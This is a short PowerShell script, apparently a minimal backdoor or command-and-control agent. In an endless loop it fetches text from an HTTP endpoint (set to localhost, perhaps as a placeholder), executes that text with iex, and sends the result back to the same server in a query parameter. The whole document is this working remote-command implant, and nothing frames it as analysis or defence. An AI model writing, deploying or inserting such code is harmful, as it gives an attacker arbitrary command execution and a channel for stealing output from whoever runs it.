while(2 -eq 2){
	$url = "http://localhost/get.php?ip=1";
	$asd = Invoke-RestMethod -Uri $url -Method Get;
	if($asd -ne ""){
	$req=iex($asd);
	$urlx = "http://localhost/get.php?log=$req";
	Invoke-RestMethod -Uri $urlx -Method Get;
	}
}